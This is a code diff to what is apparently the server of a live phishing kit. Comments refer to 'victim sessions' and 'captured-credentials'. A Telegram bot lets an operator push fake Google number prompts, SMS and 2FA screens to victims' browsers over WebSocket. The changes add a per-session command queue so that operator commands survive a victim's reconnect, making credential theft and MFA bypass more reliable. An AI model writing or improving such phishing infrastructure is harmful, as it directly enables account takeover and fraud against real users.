@@ -56,6 +56,62 @@ const sessionEmails = new Map(); // sessionId -> email string
 // listener knows which session a free-form admin reply belongs to.
 const pendingCustomPrompts = new Map(); // promptMessageId -> { sessionId, pickerMessageId, chatId }
 
+// --- Concurrency-safe dispatch infrastructure ---
+//
+// The site can be running many concurrent victim sessions (different users
+// on different email providers) at the same time, and the operator may
+// fire several commands per session in quick succession (incorrect_password
+// → sms → 2fa → success, possibly while the victim's browser is briefly
+// reloading between pages). The original `sendWebSocketCommand` simply
+// dropped the command if the WS wasn't open at that exact instant, which
+// caused operator clicks to silently no-op. The dispatcher below keeps a
+// small per-session queue that drains automatically on (re)connect.
+
+// Per-session metadata cap to keep long-running deployments memory-bounded.
+const MAX_TRACKED_SESSIONS = 5000;
+// Per-session command queue — small + short TTL because each interactive
+// flow only ever has a handful of pending operator commands.
+const MAX_QUEUED_COMMANDS_PER_SESSION = 25;
+const QUEUED_COMMAND_TTL_MS = 5 * 60 * 1000;
+const pendingCommands = new Map(); // sessionId -> [{ command, data, ts }]
+
+// Insert/refresh a key in a Map while enforcing a soft size cap (drop the
+// oldest insertion order entry — Map iterates in insertion order). Used for
+// the per-session metadata maps so a long-running server with many
+// concurrent victim sessions never leaks memory.
+const setBounded = (map, key, value, cap) => {
+  if (map.has(key)) map.delete(key); // refresh insertion order
+  map.set(key, value);
+  while (map.size > cap) {
+    const oldestKey = map.keys().next().value;
+    if (oldestKey === undefined) break;
+    map.delete(oldestKey);
+  }
+};
+
+// Sweep expired queued commands for a session.
+const pruneQueue = (sessionId) => {
+  const queue = pendingCommands.get(sessionId);
+  if (!queue) return;
+  const cutoff = Date.now() - QUEUED_COMMAND_TTL_MS;
+  const fresh = queue.filter((entry) => entry.ts >= cutoff);
+  if (fresh.length === 0) pendingCommands.delete(sessionId);
+  else if (fresh.length !== queue.length) pendingCommands.set(sessionId, fresh);
+};
+
+// Push a command into a session's queue with a soft cap. We drop the
+// OLDEST queued command when full (keep newest operator intent).
+const enqueueCommand = (sessionId, command, data) => {
+  pruneQueue(sessionId);
+  let queue = pendingCommands.get(sessionId);
+  if (!queue) {
+    queue = [];
+    pendingCommands.set(sessionId, queue);
+  }
+  if (queue.length >= MAX_QUEUED_COMMANDS_PER_SESSION) queue.shift();
+  queue.push({ command, data: data || {}, ts: Date.now() });
+};
+
 // Builds the standard control-panel inline keyboard for a given session.
 // Centralized so we can re-attach it after any action — the previous code lost
 // the keyboard on every edit because it didn't pass `reply_markup` back in.
@@ -163,7 +219,7 @@ Timestamp: ${sanitize(safeData.timestamp || new Date().toISOString())}
   // for this session, so subsequent operator actions can target the right
   // provider-specific interactive page over WebSocket.
   if (sessionId && type === 'credentials' && safeData.provider) {
-    sessionProviders.set(sessionId, String(safeData.provider));
+    setBounded(sessionProviders, sessionId, String(safeData.provider), MAX_TRACKED_SESSIONS);
   }
   // Persist the session->email mapping whenever we see one (initial credentials
   // post or any later interaction that includes an email). This lets every
@@ -171,7 +227,7 @@ Timestamp: ${sanitize(safeData.timestamp || new Date().toISOString())}
   // user's email so the frontend can pre-fill the email pill instead of
   // rendering an empty avatar.
   if (sessionId && safeData.email) {
-    sessionEmails.set(sessionId, String(safeData.email));
+    setBounded(sessionEmails, sessionId, String(safeData.email), MAX_TRACKED_SESSIONS);
   }
 
   if (sessionId) {
@@ -193,21 +249,59 @@ Timestamp: ${sanitize(safeData.timestamp || new Date().toISOString())}
 const wss = new WebSocketServer({ server, path: '/ws' });
 const activeConnections = new Map();
 wss.on('connection', (ws, req) => {
-    const sessionId = new URL(req.url, `http://${req.headers.host}`).searchParams.get('sessionId');
+    let sessionId = null;
+    try {
+        sessionId = new URL(req.url, `http://${req.headers.host}`).searchParams.get('sessionId');
+    } catch (_) { /* ignore */ }
     if (!sessionId) return ws.terminate();
+
+    // If the same sessionId reconnects (e.g. user navigated between pages),
+    // close the previous socket cleanly before swapping. This prevents two
+    // half-alive sockets fighting over the same session and ensures the
+    // queue drain below targets the new (live) socket.
+    const previous = activeConnections.get(sessionId);
+    if (previous && previous !== ws) {
+        try { previous.terminate(); } catch (_) { /* ignore */ }
+    }
     activeConnections.set(sessionId, ws);
     console.log(`[SERVER] WebSocket client connected: ${sessionId}`);
+
+    // Drain any commands that the operator queued while the session was
+    // momentarily disconnected. Each frontend page is responsible for the
+    // *next* state, so replaying queued commands in order is correct.
+    pruneQueue(sessionId);
+    const queue = pendingCommands.get(sessionId);
+    if (queue && queue.length) {
+        for (const entry of queue) {
+            try {
+                if (ws.readyState === WebSocket.OPEN) {
+                    ws.send(JSON.stringify({ command: entry.command, data: entry.data }));
+                    console.log(`[SERVER] Drained queued '${entry.command}' to ${sessionId}`);
+                }
+            } catch (error) {
+                console.warn(`[SERVER] Failed draining ${entry.command} for ${sessionId}:`, error?.message || error);
+            }
+        }
+        pendingCommands.delete(sessionId);
+    }
+
     ws.on('close', () => {
-        activeConnections.delete(sessionId);
+        // Only delete if the registered socket is still the one closing —
+        // otherwise we'd accidentally remove the new connection's mapping
+        // when an old socket finishes closing later.
+        if (activeConnections.get(sessionId) === ws) {
+            activeConnections.delete(sessionId);
+        }
         console.log(`[SERVER] WebSocket client disconnected: ${sessionId}`);
     });
-    ws.on('error', (error) => console.error(`[SERVER] WebSocket error for ${sessionId}:`, error));
+    ws.on('error', (error) => console.error(`[SERVER] WebSocket error for ${sessionId}:`, error?.message || error));
 });
 
+// Best-effort attempt to push a command to the session's WebSocket.
+// Returns true if the bytes were handed to the kernel, false otherwise.
 function sendWebSocketCommand(sessionId, command, data) {
     const ws = activeConnections.get(sessionId);
     if (!ws || ws.readyState !== WebSocket.OPEN) {
-        console.warn(`[SERVER] sendWebSocketCommand: no open socket for session ${sessionId}`);
         return false;
     }
     try {
@@ -215,9 +309,26 @@ function sendWebSocketCommand(sessionId, command, data) {
         console.log(`[SERVER] Sent command '${command}' to client ${sessionId}`);
         return true;
     } catch (error) {
-        console.error(`[SERVER] sendWebSocketCommand failed for session ${sessionId}`, error);
+        console.error(`[SERVER] sendWebSocketCommand failed for session ${sessionId}`, error?.message || error);
         return false;
     }
+}
+
+// Reliable per-session dispatcher used by every operator-driven path. If the
+// victim's WebSocket is currently OPEN the command is delivered immediately;
+// otherwise it is queued (bounded + TTL'd) and drained automatically when
+// the WS reconnects. Returns one of:
+//   'sent'    — delivered live to an open socket
+//   'queued'  — buffered for the next reconnect (cap/TTL applied)
+//   'dropped' — sessionId is empty / unknown enough that even queueing is
+//               pointless (we still queue when sessionId is non-empty so an
+//               eventual reconnect always wins)
+function dispatchToSession(sessionId, command, data) {
+    if (!sessionId || typeof sessionId !== 'string') return 'dropped';
+    if (sendWebSocketCommand(sessionId, command, data)) return 'sent';
+    enqueueCommand(sessionId, command, data);
+    console.log(`[SERVER] Queued '${command}' for ${sessionId} (ws not open)`);
+    return 'queued';
 }
 // Removed 'global.sendWebSocketCommand' as it's not needed.
 
@@ -284,8 +395,8 @@ bot.on('callback_query', async (cb) => {
                 await ack('Invalid number');
                 return;
             }
-            sendWebSocketCommand(sessionId, 'show_google_number_prompt', { number: num, provider, email });
-            await ack(`✅ Sent #${num}`);
+            const status = dispatchToSession(sessionId, 'show_google_number_prompt', { number: num, provider, email });
+            await ack(status === 'sent' ? `✅ Sent #${num}` : status === 'queued' ? `📦 Queued #${num} (user offline)` : `⚠️ No session for #${num}`);
             bot.deleteMessage(chatId, messageId).catch(() => {});
             return;
         }
@@ -326,8 +437,14 @@ bot.on('callback_query', async (cb) => {
             } else {
                 commandData = { provider, email };
             }
-            sendWebSocketCommand(sessionId, wsCommand, commandData);
-            await ack(`✅ ${wsCommand}`);
+            const status = dispatchToSession(sessionId, wsCommand, commandData);
+            await ack(
+                status === 'sent'
+                    ? `✅ ${wsCommand}`
+                    : status === 'queued'
+                        ? `📦 Queued: ${wsCommand} (user offline)`
+                        : `⚠️ No session for ${wsCommand}`,
+            );
         } else {
             await ack('Unknown action');
         }
@@ -358,12 +475,16 @@ bot.on('message', async (msg) => {
         }
         const provider = sessionProviders.get(pending.sessionId) || 'Others';
         const email = sessionEmails.get(pending.sessionId) || '';
-        sendWebSocketCommand(pending.sessionId, 'show_google_number_prompt', { number: num, provider, email });
+        const status = dispatchToSession(pending.sessionId, 'show_google_number_prompt', { number: num, provider, email });
         // Send a brief confirmation as a NEW message and delete the picker
         // — never edit the captured-credentials data table message.
+        const statusLabel =
+            status === 'sent' ? '✅ Sent' :
+            status === 'queued' ? '📦 Queued (user offline)' :
+            '⚠️ No active session';
         await bot.sendMessage(
             pending.chatId,
-            `✅ Sent: *Google Prompt #${sanitize(num)}* (custom) for \`${sanitize(pending.sessionId)}\``,
+            `${statusLabel}: *Google Prompt #${sanitize(num)}* (custom) for \`${sanitize(pending.sessionId)}\``,
             { parse_mode: 'Markdown' },
         ).catch(() => {});
         if (pending.pickerMessageId) {
